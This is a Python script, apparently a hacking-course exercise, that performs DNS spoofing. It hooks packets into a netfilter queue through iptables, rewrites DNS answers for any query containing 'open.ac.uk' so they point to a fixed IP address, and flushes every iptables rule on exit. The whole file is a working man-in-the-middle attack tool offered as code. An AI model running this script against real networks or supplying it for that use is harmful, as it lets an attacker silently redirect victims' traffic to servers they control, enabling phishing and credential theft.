import os
import netfilterqueue as nfq
import sys
import argparse
import scapy.all as scapy

def get_arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument("-t", "--test", dest='test', action='store_true', help='Changes Iptables rule to trap local packages. Use for development purposes.')
    options= parse.parse_args()
    return options

def packet_processor(packet):
    scapy_packet =scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        try:
            scapy_packet=modify_packet(scapy_packet)
        except IndexError:
            print('error')
            pass
        packet.set_payload(bytes(scapy_packet))
    packet.accept()

def modify_packet(packet):
    qname= packet[scapy.DNSQR].qname
    if b"open.ac.uk" in qname:
        #print('before\n',scapy_packet.show(),'-'*100)
        print('>> Spoofing target')
        packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata="146.179.40.148")
        packet[scapy.DNS].ancount =1
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.UDP].len
        del packet[scapy.UDP].chksum
        return packet
    else:
        return packet

try:
    options=get_arguments()
    if options.test:
        os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
        os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
    else:
        os.system("iptables -I Forward -j NFQUEUE --queue-num 0")
    queue = nfq.NetfilterQueue()
    queue.bind(0, packet_processor)
    queue.run()
except KeyboardInterrupt:
    print('\nUser requested termination...flusing IP tables')
    os.system("iptables --flush")
    sys.exit()
